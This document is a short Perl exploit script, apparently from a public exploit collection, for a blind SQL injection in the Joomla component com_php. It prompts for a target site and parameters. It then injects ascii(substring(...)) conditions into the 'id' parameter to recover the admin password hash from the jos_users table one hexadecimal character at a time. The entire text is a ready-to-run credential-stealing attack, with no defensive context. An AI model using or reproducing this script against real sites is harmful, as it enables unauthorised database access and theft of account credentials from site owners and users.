#!/usr/bin/perl -w
use LWP::UserAgent;
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t                      |  Chip d3 Bi0s |                       \n\n";
print "\t\t Joomla Component com_php (id) Blind SQL-injection        \n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "[-] http://wwww.host.org/Path: ";
chomp(my $target=<STDIN>);
print "[-] Introduce Itemid: ";
chomp($itemid=<STDIN>);
print "[-] Introduce id: ";
chomp($id=<STDIN>);
print "[-] Dato para and 1=1 & no para and 1=2 : ";
chomp($z=<STDIN>);

print "[+] Password: ";
$column_name="concat(password)";
$table_name="jos_users";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');


for ($x=1;$x<=32;$x++)
{            
  for ($c=48;$c<=57;$c++) 
{
 $host = $target . "/index.php?option=com_php&Itemid=".$itemid."&id=".$id."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c;

 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = $z;
 if ($content =~ /$regexp/) {$char=chr($c); print "$char";}
 }
for ($c=97;$c<=102;$c++) 
{
 $host = $target . "/index.php?option=com_php&Itemid=".$itemid."&id=".$id."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c;
 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = $z;
 if ($content =~ /$regexp/) {$char=chr($c); print "$char";}
 }
}
